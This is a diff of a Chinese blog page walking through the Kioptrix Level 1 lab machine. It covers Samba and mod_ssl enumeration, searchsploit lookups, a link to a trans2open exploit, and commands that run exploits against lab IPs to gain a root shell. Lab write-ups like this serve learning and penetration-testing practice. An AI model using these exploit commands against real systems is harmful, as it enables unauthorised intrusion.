@@ -376,23 +376,23 @@
 <h3 id="思路1——Samba-139端口"><a href="#思路1——Samba-139端口" class="headerlink" title="思路1——Samba 139端口"></a>思路1——Samba 139端口</h3><h4 id="查询Samba版本"><a href="#查询Samba版本" class="headerlink" title="查询Samba版本"></a>查询Samba版本</h4><ul>
 <li><p>三种工具：<code>enum4linux</code>、<code>smbclient</code>、<code>metasploit</code></p>
 <ul>
-<li>smbclient -L&#x3D;<ip></li>
+<li>smbclient -L&#x3D;<ip></ip></li>
 </ul>
 </li>
 <li><p>这里使用metasploit的Auxiliary模块</p>
 </li>
 </ul>
-<p><img src="/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.19.41.png" alt="截屏2024-01-29_下午9.19.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.19.41.png" alt="截屏2024-01-29_下午9.19.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
 <ul>
 <li>设置RHOSTS <strong>得到smb版本：2.2.1a</strong></li>
 </ul>
-<p><img src="/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.21.32-9034244.png" alt="截屏2024-01-29_下午9.21.32" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.21.32-9034244.png" alt="截屏2024-01-29_下午9.21.32" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
 <p>&#x3D;&#x3D;注意：oscp中不允许使用msf，这里仅供学习&#x3D;&#x3D;</p>
 <h4 id="寻找exploit"><a href="#寻找exploit" class="headerlink" title="寻找exploit"></a>寻找exploit</h4><ul>
 <li>工具：<code>searchsploit</code></li>
 <li>用searchsploit 查找：<code>searchsploit Samba 2.2.1a</code></li>
 </ul>
-<p><img src="/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.29.16-9034252.png" alt="截屏2024-01-29_下午9.29.16" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.29.16-9034252.png" alt="截屏2024-01-29_下午9.29.16" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
 <p><strong>发现存在trans2open Overflow的漏洞</strong></p>
 <ul>
 <li><p>在github中找到了脚本：<a target="_blank" rel="noopener" href="https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c">https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c</a></p>
@@ -409,7 +409,7 @@
 <li><p>根据提示：<code>./trans2open 0 192.168.89.132 192.168.89.137 </code></p>
 </li>
 </ul>
-<p><img src="/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.34.28-9034261.png" alt="截屏2024-01-29_下午9.34.28" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.34.28-9034261.png" alt="截屏2024-01-29_下午9.34.28" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
 <h5 id="searchsploit自带脚本"><a href="#searchsploit自带脚本" class="headerlink" title="searchsploit自带脚本"></a>searchsploit自带脚本</h5><ul>
 <li><p>编译</p>
 </li>
@@ -419,21 +419,21 @@
 <li><p>根据提示：<code>./10 -b 0 192.168.89.132</code></p>
 </li>
 </ul>
-<p><img src="/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8810.29.37.png" alt="截屏2024-01-29_下午10.29.37" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8810.29.37.png" alt="截屏2024-01-29_下午10.29.37" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
 <h3 id="思路2-——mod-ssl-2-8-4-端口443"><a href="#思路2-——mod-ssl-2-8-4-端口443" class="headerlink" title="思路2 ——mod_ssl&#x2F;2.8.4 端口443"></a>思路2 ——mod_ssl&#x2F;2.8.4 端口443</h3><h4 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h4><p>这里nmap把版本写的很清楚：443&#x2F;tcp  open  ssl&#x2F;https   Apache&#x2F;1.3.20 (Unix)  (Red-Hat&#x2F;Linux) mod_ssl&#x2F;2.8.4 OpenSSL&#x2F;0.9.6b</p>
 <h4 id="寻找exploit-1"><a href="#寻找exploit-1" class="headerlink" title="寻找exploit"></a>寻找exploit</h4><ul>
 <li><code>searchsploit mod_ssl 2.8.4</code></li>
 </ul>
-<p><img src="/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.33.13.png" alt="截屏2024-01-29_下午11.33.13" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.33.13.png" alt="截屏2024-01-29_下午11.33.13" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
 <p><strong>挑选一个数值更大的文件：47080.c</strong></p>
 <ul>
 <li><code>searchsploit -x unix/remote/47080.c</code></li>
 </ul>
-<p><img src="/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.35.09.png" alt="截屏2024-01-29_下午11.35.09" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.35.09.png" alt="截屏2024-01-29_下午11.35.09" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
 <p><strong>仔细看注释，里面写了requirements和编译命令</strong></p>
 <h4 id="编译和运行脚本-1"><a href="#编译和运行脚本-1" class="headerlink" title="编译和运行脚本"></a>编译和运行脚本</h4><p>这个步骤其实就是根据提示补全命令，运行脚本后，可以直接拿到root（理论上）。</p>
 <p>事实上，我尝试了很久，大概在七八次的时候才拿到root（碰运气）</p>
-<p><img src="/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.29.06.png" alt="截屏2024-01-29_下午11.29.06" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.29.06.png" alt="截屏2024-01-29_下午11.29.06" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
 <p>在此之前都是拿到一个普通用户apache的权限，因此，我学习了一些提权知识，详见<code>学习总结——关于Linux提权</code>。</p>
 <h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><h3 id="关于Samba"><a href="#关于Samba" class="headerlink" title="关于Samba"></a>关于Samba</h3><p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一个免费软件，由服务器及客户端程序构成。Samba 是能够在任何支持 SMB 协议的主机之间共享文件的一种实现，当然也包括 windows。SMB 是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB 协议是 C&#x2F;S 型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。</p>
 <h3 id="关于MSF的Auxiliary"><a href="#关于MSF的Auxiliary" class="headerlink" title="关于MSF的Auxiliary"></a>关于MSF的Auxiliary</h3><p>auxiliary 本身意思为辅助的</p>
